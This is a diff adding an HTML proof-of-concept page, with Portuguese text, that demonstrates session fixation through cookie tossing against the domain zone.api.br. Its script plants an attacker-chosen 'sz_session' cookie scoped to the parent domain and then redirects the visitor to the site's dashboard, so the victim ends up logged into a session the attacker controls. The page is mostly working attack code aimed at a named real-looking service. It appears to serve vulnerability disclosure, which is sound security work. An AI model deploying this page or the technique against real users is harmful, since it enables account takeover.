@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <title>PoC - Cookie Tossing (Zone API)</title>
+    <style>
+        body { font-family: monospace; background: #1e1e1e; color: #d4d4d4; padding: 20px; }
+        .box { border: 1px solid #ff5555; padding: 15px; margin-bottom: 20px; background: #2d2d2d; }
+        .success { color: #50fa7b; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <h2>PoC: Session Fixation via Cookie Tossing</h2>
+    <div class="box">
+        <p>1. Plantando o cookie <code>sz_session</code> com o domínio <code>.zone.api.br</code>...</p>
+        <p>2. Redirecionando para o domínio principal...</p>
+    </div>
+    <script>
+    
+        const attackerSession = "ATACANTE_SESSION_ID_12345";
+        
+        document.cookie = `sz_session=${attackerSession}; domain=.zone.api.br; path=/; SameSite=None; Secure`;
+        
+        document.write(`<p class="success">Cookie plantado com sucesso! Domain: .zone.api.br</p>`);
+
+        setTimeout(() => {
+            document.write(`<p>Redirecionando para: <a href="https://zone.api.br/dashboard">zone.api.br/dashboard</a></p>`);
+            window.location.href = "https://zone.api.br/dashboard";
+        }, 3000);
+    </script>
+</body>
+</html>
